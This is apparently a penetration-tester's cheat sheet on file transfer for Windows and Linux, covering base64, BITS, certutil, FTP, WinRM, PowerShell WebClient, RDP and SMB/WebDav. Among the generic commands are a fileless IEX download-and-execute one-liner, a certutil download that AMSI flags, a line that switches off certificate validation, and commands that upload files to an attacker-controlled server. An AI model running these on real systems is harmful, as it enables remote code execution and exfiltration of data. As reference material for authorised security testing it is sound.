Base64

Usage

Local

Linux
cat <targetfileName> | base64 -w 0; echo

sha256sum <targetFileName>
Windows
[Convert]::ToBase64String((Get-Content -path "<targetFilePath>" -Encoding byte))

Get-FileHash "<targetFilePath>" -Algorithm sha256 | select Hash

Remote

Linux
echo <base64> | base64 -d > <outputFileName>

sha256sum <outputFileName>
Windows
[IO.File]::WriteAllBytes("<outputFileName>", [Convert]::FromBase64String("<base64>"))

Get-FileHash <outputFileName> -Algorithm sha256 | select Hash

BITS

Usage

Download

Through Bitsadmin :

bitsadmin /transfer wcb /priority foreground http://<serverIP>:8000/<targetFileName> <outputFilePath>

Through Powershell :

Import-Module bitstransfer; Start-BitsTransfer -Source "http://<serverIP>:8000/<targetFileName>" -Destination "<outputFilePath>"

Certutil

Usage

Antimalware Scan Interface (AMSI) detects this as malicious Certutil usage :

certutil.exe -verifyctl -split -f http://<serverIP>:8000/<targetFileName>

FTP

Usage

Local

sudo python3 -m pyftpdlib --port 21

Option --write to allow clients to upload

sudo python3 -m pyftpdlib --port 21 --write

Remote

Download

Usage of PS Web Downloads (Net.WebClient) :

(New-Object Net.WebClient).DownloadFile('ftp://<serverIP>/<targetFileName>', 'outputFileName')

Via command file (if non-interactive shell) :

echo open <serverIP> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt

ftp -v -n -s:ftpcommand.txt
Upload
(New-Object Net.WebClient).UploadFile('ftp://<serverIP>/ftp-hosts', '<targetFilePath>')

Via command file (if non-interactive shell) :

echo open <serverIP> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt

ftp -v -n -s:ftpcommand.txt

Requirements

Python

  • pyftpdlib

PowerShell Sessions

Documentation

Default listeners :

  • HTTP -> TCP/5985
  • HTTPS -> TCP/5986

Requirements :

  • Administrative access
  • Member of Remote Management Users or have permissions for PowerShell Remoting in session configuration

Usage

Confirm WinRM port TCP/5985 is open on remote :

Test-NetConnection -ComputerName <hostname> -Port 5985

Create a session :

$Session = New-PSSession -ComputerName <hostname>

Copy from local to remote :

Copy-Item -Path <targetFilePath> -ToSession $Session -Destination <outputFilePath//>

Copy from remote to local :

Copy-Item -Path "<targetFilePath>" -Destination <outputFilePath//> -FromSession $Session

PowerShell Web Transfers

Documentation

methoddescription
OpenReadReturns the data from a resource as a Stream.
OpenReadAsyncReturns the data from a resource without blocking the calling thread.
DownloadDataDownloads data from a resource and returns a Byte array.
DownloadDataAsyncDownloads data from a resource and returns a Byte array without blocking the calling thread.
DownloadFileDownloads data from a resource to a local file.
DownloadFileAsyncDownloads data from a resource to a local file without blocking the calling thread.
DownloadStringDownloads a String from a resource and returns a String.
DownloadStringAsyncDownloads a String from a resource without blocking the calling thread.
Example :
(New-Object Net.WebClient).DownloadFile('<targetFileURL>','<outputFileName>')

Usage

Invoke-Expression (alias IEX) - Fileless

executes directly without writing to local file :

IEX (New-Object Net.WebClient).DownloadString('<targetFileURL>')

(New-Object Net.WebClient).DownloadString('<targetFileURL>') | IEX

Invoke-WebRequest (alias iwr, curl, wget)

Invoke-WebRequest <targetFileURL> -OutFile <outputFileName>

Changing User Agent

Listing out User Agents

[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Request with a Chrome User agent :

$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome

Invoke-WebRequest http://<serverIP>/<targetFileName> -UserAgent $UserAgent -OutFile "<outputFilePath>"

Common errors

Response content cannot be parsed

Add-UseBasicParsing parameter :

Invoke-WebRequest <targetFileURL> -UseBasicParsing | IEX

Certificate not trusted

Run :

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

RDP

Usage

Mount linux folder

if copy/paste is not possible through RDP, it is still possible to mount a linux folder

Rdesktop :

rdesktop <serverIP> -d <domain> -u <user> -p '<password>' -r disk:linux='<directoryToMount/>'

XfreeRDP :

xfreerdp /v:<serverIP> /d:<domain> /u:<user> /p:'<password>' /drive:linux,<directoryToMount/>

To access the folder on Windows :

  • connect to \\tsclient\
  • use the native mstsc.exe remote desktop client

SMB

Usage

Local

Unauthenticated :

sudo impacket-smbserver share -smb2support /tmp/smbshare

Authenticated :

sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Allow upload with WebDav (SMB over HTTP/S) :

sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

Remote

Download

Unauthenticated :

copy \\<serverIP>\share\<targetFileName>

Authenticated :

net use n: \\<serverIP>\share /user:test test
Upload

Connecting to the WebDav share (root directory special keyword -> DavWWWRoot) :

dir \\<serverIP>\DavWWWRoot

Uploading files :

copy <targetFilePath> \\<serverIP>\DavWWWRoot\

Requirements

Python
  • wsgidav
  • cheroot
  • impacket
